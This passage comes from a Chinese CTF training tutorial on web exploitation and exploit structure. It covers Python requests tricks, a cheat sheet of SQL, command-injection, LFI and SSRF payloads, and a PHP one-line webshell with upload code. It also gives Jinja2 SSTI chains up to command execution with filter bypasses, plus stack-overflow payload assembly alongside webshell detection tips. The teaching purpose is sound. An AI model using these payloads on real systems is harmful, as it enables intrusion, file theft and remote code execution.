|----|------|----------|
| 200 | 成功 | 重点看响应内容 |
| 301 / 302 | 重定向 | 跟 `Location` 走；警惕"仅前端跳转≠权限校验" |
| 403 | 禁止访问 | 权限没过——伪造请求头可能就进了 |
| 404 | 不存在 | 大量 404 = 有人扫目录 |
| 500 | 服务器报错 | 参数影响了后端逻辑——注入的好信号！ |

三个概念一句话记住：**GET 参数在 URL 里，POST 在请求体里；Cookie 存在浏览器，Session 存在服务器**（你手里只有钥匙 `PHPSESSID`）。

## 5.1 requests 的"攻击姿势"（进阶补丁）

```python
import requests

# ① timeout 必设！否则靶机一卡，脚本挂到天荒地老
r = requests.get(url, timeout=5)

# ② 伪造请求头过"权限校验"（Web 题最常见的钥匙串）
r = requests.get(url, headers={
    "User-Agent": "Admin-Client/1.0",
    "X-Forwarded-For": "127.0.0.1",     # 伪装"本地访问"
    "Referer": "http://ctf.example.com/admin.php",
})

# ③ 文件上传（multipart 表单）
files = {"file": ("shell.php", b"<?php @eval($_POST[1]);?>")}
r = requests.post(upload_url, files=files)

# ④ 时间盲注看耗时：r.elapsed.total_seconds() 是响应秒数
# ⑤ allow_redirects=False 能看到中间跳转，防止被重定向骗
# ⑥ 自签名证书报错：加 verify=False
# ⑦ 挂代理让 Burp 抓包，亲眼看看脚本发了什么
r = requests.get(url, proxies={"http": "http://127.0.0.1:8080"})
```

带重试的请求函数（爆破/扫描脚本标配骨架）：

```python
def fetch(url, **kw):
    """网络抖动不让脚本崩，失败重试 3 次"""
    for _ in range(3):
        try:
            return requests.get(url, timeout=5, **kw)
        except requests.RequestException as e:
            print(f"[!] 重试: {e}")
    return None
```

## 5.2 八大漏洞速查 + 检测 payload

| 漏洞 | 闻起来像 | 经典 payload |
|------|----------|--------------|
| SQL 注入 | 参数直接拼进数据库查询 | `' OR '1'='1`、`-1 UNION SELECT 1,2,3`、`1 AND SLEEP(3)` |
| 命令注入 | 参数拼进 system/exec | `; id`、`\| cat /flag`、反引号包裹 `id` |
| SSTI 模板注入 | 输入被当模板渲染 | `{{7*7}}` 页面变 49 → Jinja2；`${7*7}` → 其他引擎（第六部分专章详解） |
| XSS | 输入原样回显到页面 | `<script>alert(1)</script>` |
| 文件包含 LFI | `?file=xxx` 读文件 | `../../etc/passwd`、`php://filter/read=convert.base64-encode/resource=flag.php` |
| 文件上传 | 有上传点先传 `.php` | 传完访问，看是否被当 PHP 解析 |
| SSRF | `?url=` 让服务器发请求 | `http://127.0.0.1/`、`file:///etc/passwd` |
| 反序列化 | `unserialize($_GET[...])` | 构造恶意对象触发 PHP 魔法方法（`__destruct` 等，进阶；跟 1.9 的 Python 魔法方法同理——名字带双下划线、自动调用） |

**PHP 弱类型专题**（moectf Web 题常客）：`==` 不比较类型，`"0e123"` 和 `"0e456"` 在松散比较时都被当成科学计数法的 **0**！

```python
import hashlib

# 考题原型：if (md5($a) == md5($b) && $a != $b) → 给 flag
# 姿势 1：数组绕过 —— md5(数组) 在 PHP 里恒为 NULL，NULL==NULL 成立
#   直接请求 ?a[]=1&b[]=2 完事

# 姿势 2：0e 魔法字符串 —— md5 后都是 0e 开头，松散比较全相等
for s in ["QNKCDZO", "240610708", "s878926199a", "0e1137126905"]:
    print(f"md5({s}) = {hashlib.md5(s.encode()).hexdigest()}")
# 全部 0e 开头 → PHP 里互相 == ！！！（但 === 严格比较骗不过，注意题目细节）
```

## 5.3 webshell 与混淆还原（日志分析作业直接能用）

一句话木马的标准形态——PHP 后门的"发动机"：

```php
<?php @eval($_POST['cmd']);?>
```

- `eval()`：把字符串当代码执行，**一切一句话木马的核心**
- `$_POST['cmd']`：攻击者从请求投喂代码的通道
- 常见变体关键词：`assert`、`system`、`$_GET / $_REQUEST / $_COOKIE`、`call_user_func`、`preg_replace` 的 `/e` 模式

用 Python 还原三类常见混淆（日志取证 / 代码审计通用）：

```python
import base64, re, zlib

# ① chr() 数字拼接还原：eval(chr(115).chr(121)...)
code = "chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)"
print("".join(chr(int(n)) for n in re.findall(r"chr\((\d+)\)", code)))
# -> system

# ② base64 多层套娃：解一层看一眼，直到解不动
#    注意：必须先判断"像不像 base64"，否则普通文本会被硬解出乱码
data = b"c3lzdGVtKCdscycpOw=="       # 从日志/参数里抠出来的
while re.fullmatch(rb"[A-Za-z0-9+/=\s]+", data):
    try:
        data = base64.b64decode(data)
    except Exception:
        break
    print(data[:80])                  # -> b"system('ls');"

# ③ gzinflate(base64_decode($x)) 压缩混淆（PHP 常见套路）
#    Python 等价：先 b64decode，再 zlib 原始解压（wbits=-15）
raw = zlib.decompress(
    base64.b64decode("K64sLknN1VBPTixR0E/LSUzXK8goUNe0BgA="), -15)
print(raw)                            # -> b"system('cat /flag.php');"
```

日志里揪 webshell 的四个信号：

1. **POST 打到不常见的 .php**（尤其 /upload/ 目录里"新出现"的文件）
2. **URL 参数里带 `eval(`、`base64_decode`、`system(`、`assert(`** 关键词
3. **同一路径反复 POST 且都是 200**（正常浏览多为 GET）
4. **UA 是蚁剑/菜刀**（`AntSword` 等）——实锤级证据

---

# 第六部分：Flask 与 Jinja2 —— Python Web 题的主场

> moectf 及各大比赛的 Python 源码 Web 题，**一半以上是 Flask 写的**；最经典的 SSTI 漏洞，就发生在 Flask 自带的 Jinja2 模板引擎上。这一章把"框架 → 模板 → 漏洞"一次讲透，学完你能亲手搭靶场、亲手打穿它。

## 6.0 它们是谁

- **Flask**：Python 的**微型 Web 框架**——十几行代码就能把一个 Python 文件变成 HTTP 服务器（你现在就知道为什么 CTF 出题人爱它了：附件就一个 `app.py`）。
- **Jinja2**：Flask 内置的**模板引擎**——让 HTML 里可以写 `{{变量}}` 占位符，服务器填空后再发给浏览器。
- 两者同一作者（Pocoo 团队），天生一对：**Flask 负责收发请求，Jinja2 负责生成页面**。

```bash
pip3 install flask        # 两个都装上了（Jinja2 是 Flask 的依赖）
```

## 6.1 最小 Flask 应用：十几行变成一个网站

```python
from flask import Flask, request

app = Flask(__name__)            # 每个应用从这行开始：创建 app 对象

@app.route("/")                  # 路由：把 URL 路径绑到函数上（装饰器语法）
def index():
    return "Hello CTF!"          # 返回值就是响应体

@app.route("/user/<name>")       # 动态路由：<name> 从 URL 里取
def user(name):
    return f"Hello {name}"

@app.route("/search")
def search():
    kw = request.args.get("kw", "")      # 读 GET 参数：/search?kw=flag
    return f"你在搜: {kw}"

@app.route("/login", methods=["POST"])   # methods 指定接受的请求方法
def login():
    user = request.form.get("username")  # 读 POST 表单字段
    pwd = request.form.get("password")
    return f"user={user}, pwd={pwd}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)   # 启动开发服务器
```

拿到题目的 `app.py`，**看懂它的三步法**：

1. `@app.route(...)` 有哪些 → 罗列出所有可达的 URL（这就是你的攻击面清单）
2. 每个函数从哪取输入 → `request.args`（GET）/ `request.form`（POST）/ `request.files`（上传）
3. 输入流向了哪 → 拼进 SQL？拼进命令？拼进模板渲染？——流向决定漏洞

> CTF 阅读技巧：`app.config["FLAG"] = ...` 这行等于告诉你 flag 藏在应用配置里，`{{config}}` 一打一个准（见 6.3）。另外看到 `debug=True` 留意 Werkzeug 调试控制台（PIN 码问题，进阶）。

## 6.2 Jinja2 模板：HTML 的"填空题"

模板 = 带占位符的 HTML，Jinja2 只认两种括号：

```python
from jinja2 import Template      # 纯 Jinja2：不依赖 Flask，REPL 里直接就能玩

# {{ }} —— 输出表达式：把值填进页面
Template("Hello {{name}}!").render(name="liyuhang")   # Hello liyuhang!
Template("1+1 = {{1+1}}").render()                    # 1+1 = 2（表达式会被计算！）

# {% %} —— 逻辑语句：if / for 控制页面结构
tpl = "{% for i in range(3) %}{{i}}、{% endfor %}over"
Template(tpl).render()                                # 0、1、2、over
```

Flask 里的 `render_template("index.html", name=x)` / `render_template_string(...)` 用的是**同一个引擎**，只是额外注入了 `config`、`request` 等全局变量——注意它们**必须在 Flask 应用里运行**（路由函数内），单独贴进 REPL 会报 `Working outside of application context`。想随手做模板实验，用上面的 `jinja2.Template`。

### 漏洞的种子：三种渲染方式，一种是错的

| 写法 | 输入的角色 | 安全吗 |
|------|-----------|--------|
| `render_template("page.html", name=name)` | 模板**文件**里的占位符填**数据** | ✅ 安全 |
| `render_template_string("Hi {{name}}", name=name)` | 占位符填**数据** | ✅ 安全 |
| `render_template_string("Hi " + name)` | 输入被**拼接成模板代码本身** | 💣 SSTI |

一句话理解 SSTI（Server-Side Template Injection，服务端模板注入）的根因：

> **安全写法里，用户输入是"数据"，填进坑里；危险写法里，用户输入变成了"代码"，直接参与模板编译。**
> 这和 SQL 注入同根同源——数据与代码没分离。你的输入一旦有机会被"编译/解析"，就有了越狱的可能（对照第七部分的 payload 闭合符理论）。

## 6.3 SSTI：从 7×7 探测到命令执行

### 第一步：探测（引擎指纹）

往可疑输入点塞 `{{7*7}}`，看回显：

| 回显 | 结论 |
|------|------|
| `49` | **Jinja2 实锤**（Python 系，本文主战场） |
| `49`（但 `${7*7}` 也算） | Thymeleaf / FreeMarker（Java 系） |
| 原样显示 `{{7*7}}` | 没执行——要么写法安全，要么换 `${7*7}`、`#{7*7}` 再试 |
| `7777`（字符串拼接） | 引擎不同或过滤了，再研究 |

### 第二步：利用链（阶梯式升级，每级都先跑通再上一级）

```python
# ① 验证计算能力（探测成功即本级通过）
"{{7*7}}"                          # -> 49

# ② 读应用配置：Flask 把 config 注入了模板全局，flag 常直接躺里面
"{{config}}"                       # -> <Config {... 'FLAG': 'flag{...}' ...}>
"{{config.items()}}"               # 逐条列出，找 FLAG / SECRET_KEY

# ③ 对象链枚举（理解 Python 对象模型，见 1.9 类）
"{{''.__class__}}"                 # -> <class 'str'>：连字符串都是类的实例！
"{{''.__class__.__mro__}}"         # -> (<class 'str'>, <class 'object'>)：继承链
"{{''.__class__.__mro__[1].__subclasses__()}}"   # object 的所有子类列表（很长）

# ④ 命令执行：lipsum 一行流（Jinja2 内置全局函数 lipsum 的魔力）
"{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
# lipsum 是模板引擎自带的"生成乱数假文"函数，
# 它的 __globals__ 里恰好 import 了 os —— 一步直达命令执行
```

> ①→④ 正是 `examples/09_flask_ssti.py` 的真实运行顺序，每一步的输出都验证过。

### 魔法链解剖：为什么一串 `__xxx__` 能通天

回忆 1.9 的两个知识点：**一切皆对象** + **双下划线是魔法属性**。SSTI 的对象链就是沿着这两条腿爬的：

```
''.__class__          空字符串的类        -> str
   .__mro__           str 的继承链        -> (str, object)      ← 爬到万物之祖 object
   .__subclasses__()  object 的全部子类   -> [str, list, dict, ..., os._wrap_close, ...]
                                    ↑ 在这串列表里找到"能带你去 os"的类
   .__init__.__globals__  某个类的构造函数所在模块的全部全局变量 -> 里面有 os、sys...
```

> 本质：**模板引擎没限制你能访问的对象**，于是 `字符串 → 类 → 祖先类 → 全部子类 → 任意模块` 一路裸奔。Jinja2 的 `SandboxedEnvironment`（沙箱）就是为此而生，但 CTF 里九成的 Flask 应用没开沙箱。

### 常见过滤与绕过思路（点到为止，混个脸熟）

| 过滤了 | 绕过思路 | 例子 |
|--------|----------|------|
| `{{ }}` 括号 | 用 `{% %}` 语句块 + print | `{% print(7*7) %}` |
| 关键词如 `class` | 字符串拼接拆开 | `{{('__cla'+'ss__')}}` 经 `attr()` 取属性 |
| `.` 点号 | `attr()` 过滤器 / `[]` 取 | `''|attr('__class__')` |
| `_` 下划线 | 编码还原 | `{{'\x5f\x5fclass\x5f\x5f'}}` |
| 引号 | request 对象带数据进来 | `{{lipsum|attr(request.args.a)}}` 配 `?a=__globals__` |

> 绕过的总原则：**过滤器在"明文字符串"层面堵，你就在"字符串构造"层面绕**——拼接、编码、过滤器、从请求参数取料，和第七部分 payload 变形的思想完全一致。

## 6.4 实战：亲手搭靶场再亲手打穿（见 examples/09）

`09_flask_ssti.py` 一个文件里同时装着"防守方"和"攻击方"：

| 角色 | 内容 |
|------|------|
| 靶场（Flask 应用） | `/` 安全渲染 vs `/hello` 危险拼接，`/login` POST 通道，`config` 里藏 flag |
| 攻击（requests） | 5 步利用链：正常访问 → 安全/危险对照 → `{{7*7}}` 探测 → `{{config}}` 泄露 → lipsum 读 flag 文件 |

强烈建议跑完后**改造它**：给危险路由加各种过滤（先试过滤 `{{`），再用 6.3 的绕过表攻回去——过滤与绕过的攻防拉锯，就是 SSTI 题的全部乐趣。

## 6.5 Flask 题的标准答题流程

```
1. 拿到 app.py → 6.1 的三步法读源码，列出路由和输入流
2. 盯住三类危险 sink：
     render_template_string(拼接)   → SSTI（本章）
     os.system / subprocess(拼接)   → 命令注入（5.2）
     cursor.execute(SQL 拼接)       → SQL 注入（5.2 / 06 脚本）
3. 手工用浏览器/curl 验证一个 payload 成立
4. 套第七部分的 exp 五段式：配置区放 URL 和 payload 模板，逻辑区走利用链
5. 跑 exp 拿 flag
```

> Flask 题的 exp 与普通 Web 题毫无区别——`requests.get(url, params={"name": payload})` 而已，框架是防守方的事，攻击方眼里只有 HTTP。

---

# 第七部分：exp 与 payload 的基本结构（通用方法论）

> 前面学的都是"零件"，这一部分讲"怎么把零件装成一台机器"。
> 适用于所有方向：Rev / Crypto / Web / Pwn / Misc。

## 7.1 先把黑话翻译成人话

- **exp**（exploit 的缩写）：**解题脚本**——把你的解题思路翻译成自动跑的 Python 代码。writeup 里的"exp 如下"就是"解题脚本如下"。
- **payload**（载荷）：**你发给目标的、带攻击/解题意图的那段输入**。它可能是 SQL 注入的字符串、栈溢出的字节串、回传给服务器的答案。**构造 payload = 按目标"听得懂的语法"拼一段话，让它干你想让它干的事**。

一句话理解两者关系：**exp 是快递员，payload 是包裹**。exp 负责把 payload 精准投递到目标手里，并处理来回的收发。

## 7.2 exp 的五段式骨架

看懂了下面这张图，任何方向的 exp 你都能"对号入座"地读：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目：xxx（附题目链接）
思路：一句话（例：逐字节异或 0x2A，解出后回传）
"""                          ← 文件头：30 秒后你还会记得这题怎么解的

# ========== ① 导入区 ==========
from pwn import *            # 所有 import 集中在顶部
import requests              # 缺什么库一眼暴露

# ========== ② 配置区 ==========
HOST = "ctf.example.com"     # 题目参数全部集中在此：
PORT = 9999                  # 地址、端口、密文、密钥、偏移量……
KEY = 0x2A                   # 换题/换环境只改这里，逻辑一行不动

# ========== ③ 工具函数区 ==========
def xor_single(data, key):   # 判断标准：要写第二遍的代码 → 抽成函数
    ...

# ========== ④ 解题逻辑区 ==========
def solve():
    io = remote(HOST, PORT)      # 核心流程按"阶段"推进
    data = io.recvuntil(b":")    # 每阶段 print 确认再往下写
    ...
    return flag

# ========== ⑤ 主入口 ==========
if __name__ == "__main__":
    print(solve())            # 只调度，不写逻辑
```

**为什么强制分区？** 三个真实好处：

1. **换环境零成本**：本地调试完打远程，只改 ② 区的 `HOST/PORT`，或加一行 `io = process(...) if DEBUG else remote(...)`。
2. **崩了知道死在哪**：配置错在 ②，逻辑错在 ④，工具错在 ③——分区即分责任。
3. **半年后还能看懂**：配置区就是题目的"参数存档"，文件头就是思路的"备忘录"。

`examples/08_exp_template.py` 就是这个骨架的**可运行版**（内置模拟题），写新 exp 时直接复制它开抄。

### exp 的推进节奏：渐进式编写

**不要一口气写完 50 行再运行**。正确姿势是一阶段一阶段垒：

```python
# 阶段 1：先只确认"能连上、能收到东西"
io = remote(HOST, PORT)
print(io.recv(1024))          # 跑一遍 → 输出符合预期 → 再写下一阶段

# 阶段 2：确认"解析对了"
cipher = re.search(r"cipher: ([0-9a-f]+)", text).group(1)
print(f"{cipher=}")           # 再跑一遍

# 阶段 3：确认"解密对了"
plain = xor_single(bytes.fromhex(cipher), KEY)
print(f"{plain!r}")           # 再跑一遍

# 阶段 4：确认"回传对了"
io.sendline(plain)
print(io.recvall())           # flag 到手
```

> 每阶段运行一次、print 一次中间结果——这 30 秒的投入，能省掉"50 行写完一跑全红、不知道哪错了"的一小时。配合 1.10 的 `assert` 自检，错的阶段当场爆炸，定位零成本。

### 本地 → 远程的开关（pwn 题惯例）

```python
DEBUG = True                  # 配置区里放个开关

if DEBUG:
    io = process("./chall")           # 本地：秒连、可反复跑、能调试
else:
    io = remote(HOST, PORT)           # 远程：确认无误后只跑一次拿 flag
```

> 先在本地把逻辑跑对，最后才碰远程——远程每次连接都是开销，还可能限流。

## 7.3 payload 的解剖学：四段结构

所有方向的 payload，拆开都是同一个公式：

> **payload = 正常前缀 + 闭合符 + 攻击主体 + 收尾处理**

| 组成 | 作用 | 类比 |
|------|------|------|
| 正常前缀 | 让程序先"吃得下"，不引起怀疑 | 伪装成普通输入 |
| 闭合符 | 顶开程序原本的语法结构，"越狱" | 撬开门缝 |
| 攻击主体 | 真正要执行的恶意逻辑 | 从门缝里塞进去的东西 |
| 收尾处理 | 注释/补齐残留，防止语法报错 | 擦掉撬痕 |

用 SQL 注入逐字拆解（对照 06 脚本里的真 payload）：

```
admin' AND ASCII(SUBSTR((SELECT secret),1,1))>64-- -
└─┬──┘└┬┘└──────────────┬───────────────────┘└─┬─┘
前缀  闭合              攻击主体                  收尾
合法   ' 顶开           "问一个是否问题"           -- - 注释掉
用户名 原来的引号        （盲注的核心）             后面的原SQL残留
```

各方向 payload 对照（结构完全同款，只是语法不同）：

| 方向 | payload 实例 | 前缀 | 闭合 | 主体 | 收尾 |
|------|-------------|------|------|------|------|
| SQL 注入 | `admin' OR '1'='1` | `admin` | `'` | `OR '1'='1` | （本题不需要） |
| 命令注入 | `127.0.0.1; cat /flag` | IP 合法值 | `;` | `cat /flag` | （无） |
| SSTI | `{{7*7}}` | 无 | `{{` | `7*7` | `}}` |
| 栈溢出 | `b"A"*72 + p64(0x401234)` | 填充 72 字节 | 恰好填满缓冲区 | 返回地址 | （对齐） |
| 格式化字符串 | `%7$p` | 无 | `%` | `7$p` 泄露栈 | （无） |
| 盲注（06 脚本） | `admin' AND ...>64-- -` | `admin` | `'` | `AND ...>64` | `-- -` |

### 构造 payload 的五步思考法

拿到一个"感觉能注入"的输入点，按顺序问自己：

1. **我的输入会进入什么上下文？** SQL 语句 / shell 命令 / 模板渲染 / 内存缓冲区
2. **这个上下文的语法规则是什么？** 字符串用引号包着、命令用分号分隔、模板用 `{{}}`
3. **怎么越狱？** 找闭合符：`'` `"` `)` `;` `}}`——**先单独发一个闭合符试试报不报错**，报错 = 进了语法解析 = 有戏
4. **越狱后注入什么？** 恒真条件 / 读文件命令 / 表达式 / 地址
5. **尾巴会残留报错吗？** SQL 用 `-- -` 注释掉残留；栈溢出注意字节对齐

> 第 3 步是黄金试探法：输入一个 `'`，页面 500 报错或行为突变——说明你的字符**真的参与了语法解析**，注入八成有门。这就是"探测"在干的事。

## 7.4 payload 在 Python 里的三种组织方式

### 方式一：模板 + format（参数化的 payload，首选）

payload 里有"每次都要变的部分"（位置、猜测值），做成模板：

```python
# 06_sql_blind.py 的核心套路：mid 每轮变化
char_tpl = ("admin' AND ASCII(SUBSTR((SELECT secret FROM ctf),"
            "{pos},1))>{mid}-- -")

for pos in range(1, length + 1):
    payload = char_tpl.format(pos=pos, mid=64)
    r = requests.get(BASE, params={"name": payload})
```

> 好处：结构一眼看清；改结构只改模板一处；`{pos}` `{mid}` 像填空题。

### 方式二：字节拼接（Pwn 题的 payload 就是"拼积木"）

```python
from pwn import p64, p32

# 栈溢出 payload：填充 + 逐个数据块，长度必须精确
payload  = b"A" * 72            # ① padding：填满缓冲区（长度逆向测出）
payload += p64(0x401234)        # ② 返回地址：跳到后门函数
payload += p64(0xdeadbeef)      # ③ 后门函数要的参数

io.sendline(payload)            # exp 负责把它投递出去
```

> pwn 的 payload 结构感最强：`填充对齐 + 关键地址 + 参数`，每个块的长度都是逆向分析出来的"精确数字"。多一字节少一字节都不行——这就是为什么 ② 配置区要把 offset 这种数字单独存变量。

### 方式三：编码转换（payload 的"变形"）

payload 造好了，还得**变成通道收得了的形状**：

```python
from urllib.parse import quote
import base64

payload = "admin' AND 1=1-- -"

quote(payload)                  # URL 编码：admin%27%20AND%201%3D1--%20-
                                # Web 题：特殊字符进 URL 前要编码
                                # （requests 的 params= 会自动做，data= 不会！）

base64.b64encode(payload.encode())   # base64 变形：绕过简单的关键词过滤

payload.encode()                # 最基本：str -> bytes，网络发送的硬要求
```

> CTF 的"变形竞赛"：目标过滤 `SELECT`？试试编码（`%53ELECT`）、大小写（`sElEcT`）、注释分割（`SE/**/LECT`）。过滤器在明文层面堵，你就在编码/变形层面绕。

## 7.5 把 06_sql_blind.py 按"exp + payload"重读一遍

现在带着新框架回头看那个脚本，你会看到它就是本部分的活教材：

| 教程概念 | 在 06 里的对应 |
|----------|----------------|
| exp 五段式 | 导入区（requests/线程）、配置区（BASE 常量）、工具函数区（`ask` / `blind_binary_search`）、逻辑区（`main`）、`if __name__` |
| 渐进式推进 | 先解出长度（打印确认）→ 再逐字符（实时打印进度） |
| payload 四段结构 | `admin` 前缀 + `'` 闭合 + `AND ASCII(...)>N` 主体 + `-- -` 收尾 |
| payload 模板 | `char_tpl` 里的 `{pos}` `{mid}` 占位符 |
| 自动化 = 把手工问题交给循环 | 二分法：把"猜字符"变成 7 次固定的"是否问题" |

> **这就是读 writeup 的正确姿势**：别逐行背代码，而是问"它的 exp 分了几段、payload 的四段各是什么、循环在自动化什么"。结构看清了，换成自己的题就是换个参数的事。
